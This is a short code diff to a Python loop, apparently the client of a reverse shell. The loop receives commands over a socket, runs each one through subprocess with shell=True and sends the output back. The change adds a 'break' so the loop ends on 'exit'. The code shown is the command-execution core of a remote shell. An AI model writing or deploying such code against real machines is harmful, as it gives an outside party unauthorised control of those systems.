@@ -10,6 +10,7 @@ while True:
     
     if command=='exit':
         s.close()
+        break
         
     CMD=subprocess.run(command,shell=True,stdout=subprocess.PIPE,stderr=subprocess.STDOUT)
     s.send(CMD.stdout)
